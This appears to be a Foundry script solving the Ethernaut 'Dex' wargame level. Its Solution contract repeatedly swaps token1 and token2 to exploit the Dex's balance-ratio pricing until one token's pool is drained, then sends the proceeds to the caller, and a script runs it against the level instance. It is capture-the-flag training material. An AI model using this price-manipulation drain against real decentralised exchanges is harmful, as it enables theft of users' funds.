// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import { Script } from "forge-std/Script.sol";
import { EthernautScript } from "src/common/EthernautScript.sol";
import { Dex } from "./Problem.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";

contract Solution {
    function drainIt(Dex _dex) public {
        _dex.approve(address(_dex), type(uint256).max);
        address inputToken = _dex.token1();
        address outputToken = _dex.token2();
        address tmp;

        IERC20(inputToken).transferFrom(msg.sender, address(this), _dex.balanceOf(inputToken, msg.sender));
        uint outputTokenBalance = _dex.balanceOf(outputToken, address(_dex));
        uint inputAmount = _dex.balanceOf(inputToken, address(this));
        require(inputAmount > 0, "No input token balance");
        uint swapCount;
        while(inputAmount < 110) {
            uint inputTokenForAllOutput = _dex.balanceOf(inputToken, address(_dex));
            if(inputTokenForAllOutput < inputAmount) { 
                inputAmount = inputTokenForAllOutput;
            }
            _dex.swap(inputToken, outputToken, inputAmount);
            tmp = inputToken;
            inputToken = outputToken;
            outputToken = tmp;
            outputTokenBalance = _dex.balanceOf(outputToken, address(_dex));
            inputAmount = _dex.balanceOf(inputToken, address(this));
            ++swapCount;
        }
        require(_dex.balanceOf(inputToken, address(_dex)) == 0, "Input token balance should be 0");
        IERC20(inputToken).transfer(msg.sender, inputAmount);
    }
}

contract SolutionScript is EthernautScript {

    function solve(address payable _instanceAddress) internal override {
        Dex dex = Dex(_instanceAddress);
        address token1 = dex.token1();

        vm.startBroadcast();
        Solution solution = new Solution();
        dex.approve(address(solution), type(uint256).max);
        solution.drainIt(dex);
        vm.stopBroadcast();

        assert(dex.balanceOf(token1, address(dex)) == 0);
    }

    function getLevelAddress() internal view override returns(address) {
        return 0xC084FC117324D7C628dBC41F17CAcAaF4765f49e;
    }

}

